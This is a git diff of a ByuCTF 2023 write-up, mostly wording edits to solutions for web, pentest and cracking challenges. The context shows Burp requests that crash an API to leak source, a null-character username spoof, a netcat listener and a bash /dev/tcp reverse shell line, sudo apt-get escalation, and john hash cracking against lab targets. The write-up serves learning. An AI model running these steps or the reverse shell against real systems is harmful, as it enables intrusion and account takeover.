@@ -15,17 +15,11 @@ tags: CTF, ByuCTF, Web, Pentesting, Misc, Reversing, Forensics, CyberSecurity
 ## Author Notes 
 
 ```
-Thanks ByuCTF Team for this CTF! It was a great event beginner friendly.
+Thanks ByuCTF Team for this CTF! It was a great event beginner/intermediate friendly.
 
 First, about my WriteUp you need to know that the web challenge "urmombotnetdotnet.com" 4 and 5 was solved post CTF with the official WriteUp help. You can find them bellow.
 
 ByuCTF 2023 Official WriteUp : https://github.com/BYU-CSA/BYUCTF-2023
-
-Now about the CTF, let's start with what i disliked.
-
-The big negative point, was the challenges using VM, it was too easy to bypass and cheat on it. Should be better to host them but i agree that its not free and complicate. Also the pentest chall was cool, but more enumeration to find our goal would be better next time ^^. And finally, a lot of RSA challenges was solvable using dcode, you should think about it next time.
-
-And now let's continue with, why this ctf was really awesome!
 
 First, special thank to Legoclones, because he was doing a really big and great job. He helped a lot on my tickets post CTF to fully understand how the web challs worked and in fact, made the WriteUp for the full collection possible ^^. I also heard that his OSINT challenges was awesome and realistic because it was focus on himself and he spent 10 years on that challenges creations. So a big thanks to you Legoclones!
 
@@ -152,7 +146,7 @@ def post_register():
     return jsonify(response), 200
 ```
 
-As we can see, the code is really well documented. So let's repeat what this part of code does based on the comment.
+As we can see, the code is really well commented. So let's repeat what this part of code does based on the comment.
 
 ```
 # It's a POST request against the path "/api/register"
@@ -168,15 +162,17 @@ As we can see, the code is really well documented. So let's repeat what this par
 10. It return the user_id of the new registered user.
 ```
 
-Now. As said the description, the dev didnt make a front-end, which mean we cant access to it from the browser. But we can make request.
+Now. As said the description, the dev didn't make a front-end, which mean we cant access to it from the browser. But we can make request.
 
 So let's run Burp Suite, open a browser in the proxy tab, and intercept the page ```/api/register```.
 
-Then send the request to the repeater, and let's try to register a new account with a random  fake Ethereum address as bitcoin_wallet, you can make it yourself or use the source bellow to generate it. This address should respect the format, not needed to be a real valid address.
+Then send the request to the repeater, and let's try to register a new account with a random  fake Ethereum address as bitcoin_wallet, you can make it yourself it doesn't need to be a real one.
 
-Source : https://vanity-eth.tk/
+```
+0x74b5785F8bB5B053A7b6B7490C8Af8FDef880d03
+```
 
-Once our address generated let's register with the POST request bellow.
+Onc`e our address created let's register with the POST request bellow.
 
 > Note : Dont forget to change the request from GET to POST
 
@@ -194,7 +190,7 @@ Host: 127.0.0.1:40010
 
 ![1-NotJson](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ca2c5513-e46d-4a45-904d-c9fbc276518c)
 
-We got an error saying that the JS code wasn't loaded because our ```Content-Type``` isnt set to ```application/json```.
+We got an error saying that the JS code wasn't loaded because our ```Content-Type``` is not set to ```application/json```.
 
 So let's add the ```Content-Type```, and resend the request.
 
@@ -238,9 +234,25 @@ That's nice, but we need to find our flag which should be here. So let's analyse
         return jsonify({'message': 'Username already taken'}), 500
 ```
 
-As we can see, it will check that the email is valid, it will check that the username is valid and it will check if the username is taken. But it is not looking if the email adress is taken! 
+As we can see, it will check that the email is valid, it will check that the username is valid and it will check if the username is taken. But it is not looking if the email adress is taken!
 
-Maybe we can cause a crash by registering another username as the same email address.
+Looking at the database located at ```/database/initial.sql```.
+
+```sql
+CREATE TABLE User
+(
+  User_ID SERIAL NOT NULL,
+  Email VARCHAR(128) NOT NULL,
+  Username VARCHAR(128) NOT NULL,
+  Password VARCHAR(128) NOT NULL,
+  Blocked INT NOT NULL,
+  Bitcoin_Wallet VARCHAR(256) NOT NULL,
+  PRIMARY KEY (User_ID),
+  UNIQUE (Email),
+  UNIQUE (Username)
+);
+```
+As the Email and Username should be "UNIQUE" Maybe we can cause a crash by registering another username with the same email address.
 
 ```js
 POST /api/register HTTP/1.1
@@ -260,7 +272,7 @@ Content-Type: application/json
 
 Great the crash occure and we got a leaked source code! 
 
-On Burp Suit, put the response windows in raw mode, and start to look for the flag.
+On Burp Suit, switch the response windows in raw mode, and start to look for the flag.
 
 ![4-Flag_1](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/513bd26a-c6b2-415c-9694-d3e4e6606bd1)
 
@@ -294,7 +306,7 @@ What is flag 2? (see `byuctf{fakeflag2}` in source)
 
 ### Solution
 
-First we start by searching for our second fake flag into the sources code.
+First we start by searching for our second fake flag into the sources codes.
 
 It is located at ```/app/ticket_routes.py```.
 
@@ -327,7 +339,7 @@ def post_create_ticket(session_data):
     return jsonify(response), 200
 ```
 
-On this code we notice first that it's a POST request against ```/api/tickets```. Then we require a token.
+On this code we notice first that it's a POST request against ```/api/tickets``` endpoint. Then we require a token.
 
 As we already registered, and we get an user id, maybe we need to login to receive our tickets? Let's get a look at the login function inside the ```/app/login_routes.py``` file.
 
@@ -357,7 +369,7 @@ def post_login():
     password = request.json['password']
 ```
 
-So looking at the code, we need to make a POST request against ```/api/login``` with username and password as parameter.
+So looking at the code, we need to make a POST request against ```/api/login``` endpoint, by providing an username and a password as parameter.
 
 ```js
 POST /api/login HTTP/1.1
@@ -418,7 +430,7 @@ Once again, it's well commented, and based on it, the code will do the following
 3. It insert the ticket to the database
 ```
 
-Looking at the Database located at ```/database/initial.sql``` on the source code folder. We can notice that the maximum length is set to ```2048``` for the ```description``` parameter. So we should be able to cause a crash if we send a ticket with as descriptions more than 2048 characters.`
+Looking at the Database located at ```/database/initial.sql``` on the source code folder. We can notice that the maximum length is set to ```2048``` for the ```description``` parameter. So we should be able to cause a crash if we send a ticket with as ```description``` parameter a strings of more than 2048 characters.`
 
 ````sql
 CREATE TABLE Support_Tickets
@@ -452,16 +464,16 @@ Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZ
 
 ![6-TicketCreation](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/9299c70a-a6a3-4801-8a70-a6fe133f40d5)
 
-Great, our tickets seem to be created. 
+Great, our ticket seem to be created. 
 
-Now let's generate a more than 2048 characters using python.
+Now let's generate a strings of more than 2048 characters using python.
 
 ```python
 $ python3 -c 'print("A"*2500)'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
 ```
 
-Copy and paste the strings as description and send the request.
+Copy and paste the strings as ```description``` parameter value, and send the request.
 
 ```js
 POST /api/tickets HTTP/1.1
@@ -513,7 +525,7 @@ What is flag 3? (see `byuctf{fakeflag3}` in source)
 
 ### Solution
 
-First we need to look again where is our Fake Flag 3 once again. It is located again at ```app/tickets_routes.py```.
+First we need to locate our Fake Flag 3. It is located again at ```app/tickets_routes.py```.
 
 ```js
 # POST add a message to a ticket
@@ -554,7 +566,7 @@ def post_add_message(session_data, ticket_id):
     return jsonify(response), 200
 ```
 
-So looking at the code, we can see that it's a POST request against ```/api/tickets/<int:ticket_id>```.
+So looking at the code, we can see that it's a POST request against ```/api/tickets/<int:ticket_id>``` endpoint.
 
 This POST request can use the parameter ```message``` to add a message to the previously created ticket. Based on the comment it will :
 
@@ -565,7 +577,7 @@ This POST request can use the parameter ```message``` to add a message to the pr
 3. Insert the message into the database
 ```
 
-But as we can see into the Database ```/database/initial.sql```, once again the maximum Length of the new message is set to ```2`048```, so if we send a bunch of more than ```2048``` character as ```message``` parameter, it should crash.`
+But as we can see into the Database ```/database/initial.sql```, the maximum Length of the new message is set to ```2048```, so if we send a bunch of more than ```2048``` characters as ```message``` parameter, it should crash.
 
 ```sql
 CREATE TABLE Support_Tickets
@@ -582,7 +594,7 @@ CREATE TABLE Support_Tickets
 
 Let's try to generate a new message first.
 
-> Note : In my case it will be 1 because i've restarted the docker after the 2nd challenge, in your case it should be id 2 or whatever.
+> Note : In my case it will be "user_id : 1" because i've restarted the docker after the 2nd challenge, in your case it should be "user_id : 2" or whatever.
 
 ```js
 POST /api/tickets HTTP/1.1
@@ -598,7 +610,7 @@ Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZ
 
 ![9-NewTicket](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0ef23136-d074-4395-8220-0319e57e8e4f)
 
-Now, how to verify that our ticket is created? We can look at the begining of the ```app/tickets_routes.py``` code, where we can see a GET request against the same endpoint than the message POST request ```/api/tickets/1```.
+Now, how to verify that our ticket is created? We can look at the begining of the ```app/tickets_routes.py``` code, where we can see a GET request against the same endpoint than the "message" POST request which is ```/api/tickets/1```.
 
 ```js
 # GET ticket information
@@ -720,7 +732,7 @@ What is flag 4? (see `byuctf{fakeflag4}` in source)
 
 ### Solution
 
-First we need to find the 4th fake flag. And as we remember, we found it at the end of ```/app/login_routes.py``` at the challenge 2.
+First we need to locate the 4th fake flag. And as we remember, we found it at the end of ```/app/login_routes.py``` at the challenge 2.
 
 ```js
     # generate JWT
@@ -759,7 +771,7 @@ This mean that ```\u0000b\u0000i\u0000m``` will be interpreted as ```bim```.
 > Some cool ressource about null character (not obligatory unicode) here 
 > Source : https://owasp.org/www-community/attacks/Embedding_Null_Code
 
-So let's register again a ```bim``` user using unicode null characters in the ```/api/register``` endpoint.
+So let's register again at the ```/api/register``` endpoint, this time as ```bim``` user using unicode null characters.
 
 ```js
 POST /api/register HTTP/1.1
@@ -778,7 +790,7 @@ Content-Type: application/json
 ![15-RegisterBim](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6bcbe0cb-cdc5-4f82-baaa-edfbe9c9a99b)
 
 
-Great, now that our user ```\u000b\u000i\u000m``` let's login as ```bim``` on the ```/api/login``` endpoint.
+Great, now that our user ```\u000b\u000i\u000m``` is created, let's login as ```bim``` on the ```/api/login``` endpoint.
 
 ```js
 POST /api/login HTTP/1.1
@@ -969,7 +981,9 @@ Content-Length: 174
 
 ![18-Crash](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/f8767cf2-cc86-4073-b252-446d66ba5cbc)
 
-We managed to make it crash! Now let's look for our flag into the RAW output of the result window in Burp Suite.
+We managed to make it crash! 
+
+Now let's look for our flag into the RAW output of the result window in Burp Suite.
 
 ![19-Flag_5](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3b39c884-dd1c-424f-96f1-1eb498abbd6a)
 
@@ -1008,7 +1022,7 @@ First we need to setup the given virtual machine which is an OVA file.
 
 Download and install virtual box. Then open the OVA file on it, it should import the virtual machine.
 
-> If you try to start it and get a Network Error. You should connect your computer with an Ethernet cable. Go to the networks settings of the virtual machine inside virtual box. And finally change the network adaptater to Bridged on the "eth0".  There will be an image bellow that you can look if you need a better view.
+> If you try to start it and get a Network Error. You should connect your computer with an Ethernet cable. Go to the networks settings of the virtual machine inside virtual box. And finally change the network adaptater to Bridged on the "eth0".  There will be an image a bit later (the third image) that you can look if you need a better view.
 
 Once the machine started, it ask for a password. And as said the description, the password is the first name of the James Bond character "Q".
 
@@ -1044,7 +1058,7 @@ $ sudo netdiscover
  192.168.1.37    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                              
  192.168.1.44    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                               
  192.168.1.51    08:00:27:6d:a4:cc      3     180  PCS Systemtechnik GmbH                                                                                                
- 192.168.1.40    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd Co.,Ltd.                                                                                       
+ 192.168.1.40    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                    
 ```
 
 Our taget is identifier with the IP address ```192.168.1.51```.
@@ -1217,7 +1231,7 @@ $ groups
 james_bond agents
 ```
 
-Nice, we are from ```agents``` group! Let's look at my kali ip adderss which is ```192.168.1.39``` in this case, and setup a listener on port ```1337```.
+Nice, we are from ```agents``` group! Let's look at my kali ip adderss which is ```192.168.1.39``` in this case, and then setup a listener on port ```1337```.
 
 ```bash
 $ nc -nvlp 1337
@@ -1236,7 +1250,9 @@ ps -aux
 bash -i >& /dev/tcp/192.168.1.39/1337 0>&1
 ```
 
-We got a shell as ```q``` and we got the flag!
+Wait a bit and we got a shell as ```q``` in our netcat listener.
+
+And we got the flag!
 
 ```bash
 $ nc -nvlp 1337
@@ -1279,7 +1295,7 @@ Submit flag4 here.
 
 ### Solution
 
-Looking at the agent ```q``` sudo permission, we can see that he is allowed to run as any users the command ```/usr/bin/apt-get``` without specifying any passwords.
+Looking at the agent ```q``` sudo permissions, we can see that he is allowed to run as any users the command ```/usr/bin/apt-get``` without specifying any passwords.
 
 ```
 q@MI6:~$ sudo -l
@@ -1590,7 +1606,7 @@ $ john --format=raw-sha512 --show 006_3.txt
 4 password hashes cracked, 0 left
 ```
 
-Great! We get all the passwords! But now, we need to be sure which password is which hash, to know the flag format.
+Great! We get all the passwords! But now, we need to be sure which password is which hash, to know the right order for the flag.
 
 For this simply edit the file, and add an username before every hashes.
 
@@ -1732,7 +1748,7 @@ Looking at the code, we notice the ```console.log``` which return this result.
 
 ![3-ConsoleStrange](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/70ecf025-981b-443d-95e5-1436ec7765bf)
 
-We can notice that it forgot a lot of code previously, and we notice something which seem like some flag parts.
+We can notice that it ignore a lot of code previously, and we notice something which seem like some flag parts.
 
 ![4-IsThatAFlagPart](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5a9145d3-d408-4c05-ad58-9f5917df8b5a)
 
